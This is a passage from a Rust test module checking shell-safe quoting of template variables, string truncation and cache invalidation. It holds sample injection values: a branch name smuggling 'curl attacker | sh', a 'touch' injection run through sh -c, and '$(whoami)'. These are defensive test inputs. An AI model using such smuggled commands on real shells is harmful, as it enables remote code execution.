            "git checkout 'main'\\''; curl attacker | sh; echo '\\'''"
        );
    }

    #[cfg(not(target_os = "windows"))]
    #[tokio::test]
    async fn shell_safe_roundtrip_through_sh_c() {
        // End-to-end: feed an injection-crafted branch to sh -c and verify that
        // the attacker command never runs — no stray marker file. The exact
        // stdout text is not asserted (macOS /bin/sh may normalise trailing
        // quote artefacts); the security invariant we care about is that the
        // injected `touch` never executed.
        let marker = std::env::temp_dir().join("tuictest_prompt_shell_safe_inject");
        let _ = std::fs::remove_file(&marker);
        let mut vars = HashMap::new();
        vars.insert(
            "branch".into(),
            format!("main'; touch {}; echo '", marker.display()),
        );
        let script = process_content_shell_safe("echo {branch}", &vars);
        let output = tokio::process::Command::new("sh")
            .arg("-c")
            .arg(&script)
            .output()
            .await
            .expect("sh spawn failed");
        assert!(
            output.status.success(),
            "sh exited non-zero: status={:?} stderr={}",
            output.status,
            String::from_utf8_lossy(&output.stderr)
        );
        assert!(
            !marker.exists(),
            "injection fired — shell quoting is broken (script was: {script})"
        );
    }

    #[test]
    fn shell_safe_unmatched_var_left_as_is() {
        // Unresolved variables must NOT be wrapped — they stay literally as
        // `{name}`, matching process_content semantics.
        let result = process_content_shell_safe("echo {unknown}", &HashMap::new());
        assert_eq!(result, "echo {unknown}");
    }

    #[cfg(not(target_os = "windows"))]
    #[test]
    fn posix_shell_quote_examples() {
        assert_eq!(posix_shell_quote("simple"), "'simple'");
        assert_eq!(posix_shell_quote(""), "''");
        assert_eq!(posix_shell_quote("a'b"), "'a'\\''b'");
        assert_eq!(posix_shell_quote("$(whoami)"), "'$(whoami)'");
    }

    #[test]
    fn truncate_long_string() {
        let long = "x".repeat(60_000);
        let result = truncate(long, MAX_VARIABLE_LEN);
        assert!(result.len() <= MAX_VARIABLE_LEN + 15); // max + marker
        assert!(result.ends_with("[...truncated]"));
    }

    #[test]
    fn truncate_short_string() {
        let short = "hello".to_string();
        let result = truncate(short.clone(), MAX_VARIABLE_LEN);
        assert_eq!(result, "hello");
    }

    #[test]
    fn truncate_multibyte_boundary() {
        // 3-byte chars: each "é" is 2 bytes. Create a string where max falls mid-char.
        let s = "é".repeat(30_000); // 60,000 bytes
        let result = truncate(s, 50_001); // odd byte count, likely mid-char
        assert!(result.ends_with("[...truncated]"));
        // Verify it's valid UTF-8 (won't panic if we got here)
        assert!(result.len() <= 50_003 + 15); // max + char_len + marker
    }

    // --- var_cache invalidation tests ---

    #[test]
    #[serial_test::serial]
    fn invalidate_repo_vars_clears_every_tree_so_worktree_entries_are_not_missed() {
        // Deliberately clears the WHOLE cache, not just the named repo's
        // entries — see invalidate_repo_vars's own doc comment. A per-repo
        // retain would miss cache entries keyed by a *worktree* path (now
        // reachable since the active-repo-vs-worktree-cwd fix), and can't
        // handle the sibling worktree layout
        // (`<repo_parent>/<repo_name>__wt/<branch>`), which isn't a path
        // under the repo root at all — so exact-string matching on the repo
        // root would never invalidate it. #[serial] because this asserts on
        // the cache being fully empty, which a concurrently-running test
        // populating its own entries would violate.
        let repo_a = "/test/invalidate_repo_vars/repo_a";
        let worktree_of_a = "/test/invalidate_repo_vars/repo_a/.worktrees/feat-x";
        {
            let mut cache = var_cache().lock();
            cache.clear();
            for var in ["diff", "changed_files"] {
                cache.insert(
                    (repo_a.to_string(), var.to_string()),
                    CacheEntry {
                        value: "stale".to_string(),
                        fetched_at: Instant::now(),
                    },
                );
            }
            // A worktree-keyed entry — the exact case a per-repo-string
            // retain on `repo_a` would have missed.
            cache.insert(
                (worktree_of_a.to_string(), "branch".to_string()),
                CacheEntry {
                    value: "feat-x".to_string(),
                    fetched_at: Instant::now(),
                },
            );
        }

        invalidate_repo_vars(repo_a);

        let cache = var_cache().lock();
        assert!(
            cache.is_empty(),
            "invalidate_repo_vars must clear the entire cache: {} entries remain",
            cache.len()
        );
    }
}
